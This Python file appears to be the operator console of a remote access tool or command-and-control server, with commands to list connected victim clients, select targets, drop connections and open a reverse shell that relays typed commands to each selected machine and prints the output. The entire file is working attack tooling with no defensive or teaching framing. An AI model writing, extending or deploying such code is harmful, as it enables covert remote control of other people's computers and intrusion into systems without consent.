import server_folder.config as config
from socket import error as socket_error


class Menu:
    def __init__(self, server):
        self.server = server
        self.targets = [] # Will be filled by the tick-boxes in the GUI

    def help(self):
        print('Available commands are:\n'
              '[*] list   -   Show the list of connected clients.\n'
              '[*] select -   Select a client from the list to operate commands on.\n'
              '[*] quit   -   Stop operating on the selected client.\n'
              '[*] kill   -   Release a connection of a client.\n'
              '[*] shell  -   Get reverse shell access to the client.\n')

    def client_list(self):
        # Deletes invalid connections
        print('--------Clients--------\n')
        for i, conn in enumerate(config.all_connections):
            try:
                conn.send(str.encode(' '))
                conn.recv(config.BUFFER_SIZE)
            except socket_error:
                config.all_connections.pop(i)
                config.all_addresses.pop(i)
                continue
            print('{} |   {}    {}'.format(i, config.all_addresses[i][0], config.all_addresses[i][1]))
        print('\n')

    def select(self, target):
        try:
            self.targets.append(target)
            print('[*] You are now connected to ', config.all_addresses[target])
        except socket_error:
            print('[!] Invalid selection')
            self.quit()

    def quit(self, target=-1):
        """ Dis-selects the selected target"""
        if target == -1:
            self.targets = []
        else:
            self.targets.pop(target)

    def kill(self):
        for target in self.targets:
            try:
                config.all_connections[target].close()
                print('[*] Successfully killed ', config.all_addresses[target], '\n')
                config.all_connections.pop(target)
                config.all_addresses.pop(target)
                self.quit(target)
            except socket_error:
                print('[!] Failed to kill client\n')

    def shell(self):
        config.custom_console = 'shell> '
        for target in self.targets:
            conn = config.all_connections[target]
            self.server.send(conn, 'shell')

        stop_flag = False
        while not self.targets or not stop_flag:
            cmd = input(config.custom_console)
            for target in self.targets:
                print('target: ', target)
                try:
                    conn = config.all_connections[target]
                    if cmd.lower() == 'quit':
                        self.server.send(conn, 'quit')
                        stop_flag = True
                        break
                    self.server.send(conn, cmd)
                    received = self.server.receive(conn).split('>', 1)
                    print(received)  # Received shell data
                except socket_error:
                    print('[!] Connection was lost..')
                    self.quit(target)


        config.custom_console = 'oSys> '
